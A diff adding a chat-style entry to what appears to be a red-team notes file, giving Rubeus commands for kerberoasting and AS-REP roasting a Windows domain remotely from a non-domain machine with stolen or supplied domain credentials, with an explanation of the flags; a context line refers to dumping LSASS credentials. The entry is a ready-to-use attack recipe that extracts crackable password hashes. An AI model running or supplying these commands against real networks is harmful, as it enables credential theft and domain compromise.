@@ -1433,3 +1433,18 @@ Dumping Lsass without mimikatz
 	-
 	??five. ProcessDump.exe from Cisco Jabber
 ```
+
+Date: 2021-03-16T17:28:49.183Z
+From: cybercat
+Message: Carrying out a kerberoasting attack through vpn from a non-domain car with vpn credits
+```
+kerberoast remote from non-domain machine with domain user creds:
+1. Rubeus.exe kerberoast /dc:wesads15.wes.local /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\ProgramData\hashes.txt /creduser:domain.local\username /credpassword:UserPass!
+
+Asreproast remote from non-domain machine with domain user creds:
+2. Rubeus.exe asreproast /format:hashcat /outfile:C:\ProgramData\asrephashes.txt /dc:dc.domain.local /creduser:domain.local\username /credpassword:UserPass!
+```
+as you can see we do the same as in the normal attack, just add 3 new attributes:
+/dc: - specify the domain controller
+/creduser: - login of the domain user from which we are running
+/credpassword: - password of the domain user from which we are running
